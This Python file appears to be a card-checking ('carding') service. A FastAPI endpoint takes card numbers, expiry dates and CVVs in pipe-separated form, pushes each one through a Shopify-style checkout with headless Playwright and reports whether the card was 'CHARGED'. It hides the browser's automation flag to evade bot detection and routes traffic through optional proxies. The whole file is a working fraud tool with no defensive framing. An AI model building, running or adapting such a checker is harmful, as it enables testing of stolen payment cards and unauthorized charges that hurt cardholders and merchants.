from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
import uvicorn

app = FastAPI()

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    async with async_playwright() as p:
        browser = await p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
        
        context_args = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720}
        }
        if proxy:
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        page = await context.new_page()
        
        try:
            # 1. الدخول لصفحة التشيك أوت
            await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
            
            # 2. ملء البيانات باستخدام تحديد الأدوار (أكثر دقة في تجاوز الـ Timeout)
            await page.get_by_role("textbox", name="Email").fill("testuser@gmail.com")
            await page.get_by_placeholder("First name").fill("John")
            await page.get_by_placeholder("Last name").fill("Doe")
            await page.get_by_placeholder("Address").first.fill("123 Street")
            
            # 3. الانتقال للخطوة التالية
            await page.get_by_role("button", name="Continue").click()
            await page.wait_for_load_state("networkidle", timeout=15000)
            
            # 4. محاولة الضغط على "Continue to payment" إذا ظهرت
            try:
                await page.get_by_role("button", name="Continue to payment").click(timeout=5000)
                await page.wait_for_load_state("networkidle", timeout=15000)
            except:
                pass

            # 5. التعامل مع الـ iframe الخاص بالدفع
            await page.wait_for_selector('iframe[title="Secure card payment input frame"]', timeout=20000)
            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
            
            # تعبئة البيانات
            await frame.locator('input[name="number"]').fill(cc.split('|')[0])
            await frame.locator('input[name="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
            await frame.locator('input[name="verification_value"]').fill(cc.split('|')[3])
            
            # 6. الضغط على زر الدفع
            await page.locator('button#continue-button').click()
            await page.wait_for_load_state("networkidle", timeout=15000)
            
            # التحقق من النتيجة
            status = "true" if "thank-you" in page.url or "success" in page.content().lower() else "false"
            
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
            
        except Exception as e:
            await browser.close()
            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
